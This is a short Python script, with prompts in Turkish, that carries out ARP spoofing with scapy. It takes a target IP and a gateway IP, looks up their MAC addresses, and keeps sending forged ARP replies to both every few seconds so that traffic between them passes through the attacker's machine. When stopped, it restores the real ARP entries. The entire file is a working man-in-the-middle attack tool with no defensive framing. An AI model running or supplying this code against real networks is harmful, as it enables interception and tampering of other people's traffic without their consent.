from scapy.all import *
import time 
import ipaddress
import sys
from colorama import Fore, Style
def get_user_input():
    try:
        while True:
            target_ip = input("[+]: Hedef IP'sini giriniz: ")
            ipaddress.IPv4Address(target_ip)
            break
    except ipaddress.AddressValueError:
        print("Lütfen geçerli bir IPv4 adresi girin!")
        sys.exit(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\nProgram kapatıldı.")
        sys.exit(1)

    try:
        gateway_ip = input("[+]: Modem IP'sini giriniz: ")
        ipaddress.IPv4Address(gateway_ip)
    except ipaddress.AddressValueError:
        print("Lütfen geçerli bir IPv4 adresi girin!")
        sys.exit(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\nProgram kapatıldı.")
        sys.exit(1)

    return target_ip, gateway_ip

def get_mac_address(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast / arp_request
    answered_list, _ = srp(combined_packet, timeout=1, verbose=False)
    return answered_list[0][1].hwsrc

def arp_spoofing(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    send(arp_response, verbose=False)

def reset_operation(spoofed_ip, gateway_ip):
    spoofed_mac = get_mac_address(spoofed_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = ARP(op=2, pdst=spoofed_ip, hwdst=spoofed_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(arp_response, verbose=False, count=5)

def main():
    try:
        target_ip, gateway_ip = get_user_input()
        number = 0

        while True:
            arp_spoofing(target_ip, gateway_ip)
            arp_spoofing(gateway_ip, target_ip)
            number += 2
            print("\r Paket Gönderildi: " + str(number), end="")
            time.sleep(4)

    except KeyboardInterrupt:
        print("\nProgramdan Çıkılıyor...")
        reset_operation(target_ip, gateway_ip)
        reset_operation(gateway_ip, target_ip)

if __name__ == "__main__":
    main()
